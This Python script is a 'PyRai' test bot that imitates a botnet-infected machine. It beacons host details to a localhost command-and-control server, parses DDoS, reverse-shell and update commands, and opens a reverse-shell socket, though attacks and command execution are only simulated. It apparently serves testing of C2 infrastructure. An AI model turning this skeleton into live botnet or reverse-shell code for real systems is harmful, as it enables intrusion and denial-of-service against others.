#!/usr/bin/env python3
"""
PyRai Test Bot - Simulates infected machine for testing
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
"""

import socket
import json
import time
import threading
import subprocess
import sys
import os
from datetime import datetime

# Configuration
C2_SERVER = "127.0.0.1"
C2_PORT = 31340
REVERSE_SHELL_PORT = 31341

class TestBot:
    """Test bot that simulates infected machine"""
    
    def __init__(self, bot_id=None):
        self.bot_id = bot_id or f"test_bot_{int(time.time())}"
        self.running = False
        self.c2_socket = None
        
    def connect_to_c2(self):
        """Connect to C2 server"""
        try:
            self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.c2_socket.connect((C2_SERVER, C2_PORT))
            
            # Send bot info
            bot_info = {
                'ip': socket.gethostbyname(socket.gethostname()),
                'os': os.name,
                'platform': sys.platform,
                'bot_id': self.bot_id,
                'timestamp': str(datetime.now())
            }
            
            self.c2_socket.send(json.dumps(bot_info).encode())
            print(f"[Bot] Connected to C2 server as {self.bot_id}")
            
            return True
            
        except Exception as e:
            print(f"[Bot] Failed to connect to C2: {str(e)}")
            return False
    
    def listen_for_commands(self):
        """Listen for commands from C2"""
        while self.running:
            try:
                command = self.c2_socket.recv(1024).decode()
                
                if not command:
                    break
                    
                if command == "heartbeat":
                    # Respond to heartbeat
                    continue
                    
                print(f"[Bot] Received command: {command}")
                
                # Parse command
                cmd_parts = command.split(' ')
                
                if cmd_parts[0] == 'ddos':
                    self.handle_ddos_command(cmd_parts)
                elif cmd_parts[0] == 'shell':
                    self.handle_shell_command()
                elif cmd_parts[0] == 'update':
                    self.handle_update_command(cmd_parts)
                else:
                    # Execute system command
                    self.execute_command(command)
                    
            except Exception as e:
                print(f"[Bot] Command listener error: {str(e)}")
                break
    
    def handle_ddos_command(self, cmd_parts):
        """Handle DDoS attack command"""
        if len(cmd_parts) >= 4:
            target_ip = cmd_parts[1]
            target_port = int(cmd_parts[2])
            duration = int(cmd_parts[3])
            
            print(f"[Bot] Starting DDoS attack on {target_ip}:{target_port} for {duration}s")
            
            # Start DDoS in separate thread
            ddos_thread = threading.Thread(
                target=self.ddos_attack,
                args=(target_ip, target_port, duration),
                daemon=True
            )
            ddos_thread.start()
    
    def ddos_attack(self, target_ip, target_port, duration):
        """Simulate DDoS attack (testing only)"""
        end_time = time.time() + duration
        attack_count = 0
        
        print(f"[Bot] DDoS simulation started against {target_ip}:{target_port}")
        
        while time.time() < end_time:
            try:
                # Simulate attack (just print for testing)
                attack_count += 1
                if attack_count % 100 == 0:
                    print(f"[Bot] DDoS simulation: {attack_count} attacks sent")
                
                time.sleep(0.01)  # Rate limiting for testing
                
            except Exception as e:
                print(f"[Bot] DDoS error: {str(e)}")
                break
        
        print(f"[Bot] DDoS simulation completed: {attack_count} total attacks")
    
    def handle_shell_command(self):
        """Handle reverse shell command"""
        print(f"[Bot] Starting reverse shell to {C2_SERVER}:{REVERSE_SHELL_PORT}")
        
        # Start reverse shell in separate thread
        shell_thread = threading.Thread(
            target=self.reverse_shell,
            daemon=True
        )
        shell_thread.start()
    
    def reverse_shell(self):
        """Establish reverse shell connection"""
        try:
            shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_socket.connect((C2_SERVER, REVERSE_SHELL_PORT))
            
            print(f"[Bot] Reverse shell connected")
            
            while True:
                try:
                    command = shell_socket.recv(1024).decode()
                    
                    if command.lower() == 'exit':
                        break
                    
                    # Execute command (simulated for testing)
                    if command.startswith('echo'):
                        output = command.replace('echo ', '') + '\n'
                        shell_socket.send(output.encode())
                    else:
                        # Simulate command execution
                        output = f"[Test] Simulated execution of: {command}\n"
                        shell_socket.send(output.encode())
                        
                except Exception as e:
                    print(f"[Bot] Shell error: {str(e)}")
                    break
            
            shell_socket.close()
            print(f"[Bot] Reverse shell disconnected")
            
        except Exception as e:
            print(f"[Bot] Failed to establish reverse shell: {str(e)}")
    
    def handle_update_command(self, cmd_parts):
        """Handle update command"""
        if len(cmd_parts) >= 2:
            update_url = cmd_parts[1]
            print(f"[Bot] Update requested from: {update_url}")
            print(f"[Bot] Update simulation - would download and execute new payload")
    
    def execute_command(self, command):
        """Execute system command (simulated for testing)"""
        print(f"[Bot] Executing command: {command}")
        
        # For testing, just simulate command execution
        if command == 'whoami':
            print(f"[Bot] Command output: test_user")
        elif command == 'pwd':
            print(f"[Bot] Command output: /tmp")
        else:
            print(f"[Bot] Command output: [Simulated execution of '{command}']")
    
    def start(self):
        """Start the bot"""
        self.running = True
        
        if not self.connect_to_c2():
            return False
        
        # Start command listener
        listener_thread = threading.Thread(
            target=self.listen_for_commands,
            daemon=True
        )
        listener_thread.start()
        
        return True
    
    def stop(self):
        """Stop the bot"""
        self.running = False
        
        if self.c2_socket:
            try:
                self.c2_socket.close()
            except:
                pass
        
        print(f"[Bot] {self.bot_id} stopped")

def main():
    """Main test bot function"""
    print("="*50)
    print("PyRai Test Bot - Simulated Infected Machine")
    print("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
    print("="*50)
    
    # Safety confirmation
    print("\n[SAFETY CONFIRMATION]")
    print("This test bot will:")
    print("- Connect to the C2 server")
    print("- Simulate botnet member behavior")
    print("- Execute simulated commands")
    print("- Participate in simulated attacks")
    print("Ensure you have proper authorization for this testing.")
    confirm = input("Type 'AUTHORIZED' to continue: ")
    
    if confirm != 'AUTHORIZED':
        print("Safety confirmation failed. Exiting.")
        sys.exit(1)
    
    # Create and start test bot
    bot_id = input("Enter bot ID (or press Enter for auto-generated): ").strip()
    if not bot_id:
        bot_id = None
    
    test_bot = TestBot(bot_id)
    
    if test_bot.start():
        print(f"[Bot] Test bot started successfully")
        
        try:
            # Keep bot running
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n[Bot] Shutdown signal received")
        finally:
            test_bot.stop()
    else:
        print(f"[Bot] Failed to start test bot")

if __name__ == "__main__":
    main() 